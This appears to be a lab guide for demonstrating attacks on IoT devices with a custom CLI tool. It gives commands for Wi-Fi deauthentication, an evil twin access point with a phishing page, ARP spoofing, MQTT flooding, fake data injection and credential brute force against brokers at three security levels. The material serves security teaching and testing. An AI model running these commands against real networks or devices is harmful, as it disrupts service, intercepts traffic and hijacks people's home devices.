# IoT Security Attack Demonstration Guide

## Overview
This guide provides step-by-step instructions for using the SECOT (Security & IoT) CLI tool to demonstrate various attack scenarios against IoT devices and networks. The guide covers network compromise techniques and IoT-specific attacks against different security levels.

## Prerequisites
- Kali Linux or similar penetration testing environment
- External Wi-Fi adapter supporting monitor mode
- Victim IoT projects deployed and running
- Required tools installed (see install_dependencies.py)

## Phase 1: Network Compromise

### Step 1: Initial Network Scan
```bash
# Scan for available networks
./secot scan -i wlan0 -d 30

# This will show:
# - Available APs
# - Connected clients
# - Signal strength
# - Security type
```

### Step 2: Deauthentication Attack
```bash
# Deauth all clients from target AP
./secot deauth -i wlan0 -a "00:11:22:33:44:55" -p 100

# Deauth specific client
./secot deauth -i wlan0 -a "00:11:22:33:44:55" -c "AA:BB:CC:DD:EE:FF" -p 100
```

### Step 3: Evil Twin Attack
```bash
# Deploy evil twin AP
./secot evil-twin -i wlan0 -s "VictimNetwork" -c 6 -t "192.168.1.0/24" -p "phishing_template.html"
```

### Step 4: ARP Spoofing
```bash
# Start ARP spoofing between victim and gateway
./secot arp-spoof -i wlan0 -v "192.168.1.100" -g "192.168.1.1" -d 0
```

## Phase 2: IoT Attack Scenarios

### Scenario 1: No Security MQTT Broker (Port 1883)

1. **Flood Attack**
```bash
# Flood the MQTT broker with messages
./secot mqtt-attack -b localhost -p 1883 flood -t "home/weatherstation/temperature" -c 1000

# Flood smart light control
./secot mqtt-attack -b localhost -p 1883 flood -t "home/smartlight/command" -c 1000
```

2. **Fake Data Injection**
```bash
# Inject fake temperature data
./secot mqtt-attack -b localhost -p 1883 fake-publish -t "home/weatherstation/temperature" -m "{\"temperature\": 999.9}" -c 1

# Inject fake humidity data
./secot mqtt-attack -b localhost -p 1883 fake-publish -t "home/weatherstation/humidity" -m "{\"humidity\": 999.9}" -c 1

# Control smart light
./secot mqtt-attack -b localhost -p 1883 fake-publish -t "home/smartlight/command" -m "{\"state\":\"ON\",\"brightness\":255}" -c 1
```

### Scenario 2: Basic Security MQTT Broker (Port 1884)

1. **Credential Brute Force**
```bash
# Create users.txt with common usernames
echo -e "weather_station\nweb_dashboard\nandroid_app\nadmin" > users.txt

# Create passwords.txt with 4-digit PINs
echo -e "0000\n1111\n1234\n5678\n9012" > passwords.txt

# Run brute force attack
./secot mqtt-attack -b localhost -p 1884 brute-force -u users.txt -p passwords.txt
```

2. **Attack with Compromised Credentials**
```bash
# Once credentials are found, use them to inject fake data
./secot mqtt-attack -b localhost -p 1884 fake-publish -t "home/weatherstation/temperature" -m "{\"temperature\": 999.9}" -c 1
```

### Scenario 3: Secure MQTT Broker (Port 8883)

1. **TLS/SSL Testing**
```bash
# Attempt brute force with TLS
./secot mqtt-attack -b localhost -p 8883 brute-force -u users.txt -p passwords.txt

# Attempt fake publish with TLS
./secot mqtt-attack -b localhost -p 8883 fake-publish -t "home/weatherstation/temperature" -m "{\"temperature\": 999.9}" -c 1
```

## Attack Demonstration Flow

1. **Initial Setup**
   - Start the victim projects with desired security level
   - Ensure all components are running (NodeMCU, web dashboard, Android app)

2. **Network Compromise**
   - Use scan to identify target network
   - Deauth clients from legitimate AP
   - Deploy evil twin
   - Start ARP spoofing

3. **MQTT Attack Execution**
   - For No Security:
     - Direct message injection
     - Broker flooding
   - For Basic Security:
     - Brute force credentials
     - Use compromised credentials
   - For Secure:
     - Test TLS/SSL protection
     - Attempt credential attacks

4. **Observe Effects**
   - Watch web dashboard for fake data
   - Monitor NodeMCU LCD display
   - Check Android app behavior
   - Analyze MQTT broker logs

## Expected Results

1. **No Security**
   - Successful message injection
   - Dashboard shows fake data
   - Broker may become unresponsive

2. **Basic Security**
   - Credential brute force success
   - Access with compromised credentials
   - Limited protection

3. **Secure**
   - Failed brute force attempts
   - TLS/SSL protection
   - Strong authentication prevents unauthorized access

## Notes
- Always perform these attacks in a controlled environment
- Document all findings and observations
- Use the results to improve security measures
- Consider implementing additional security layers based on findings 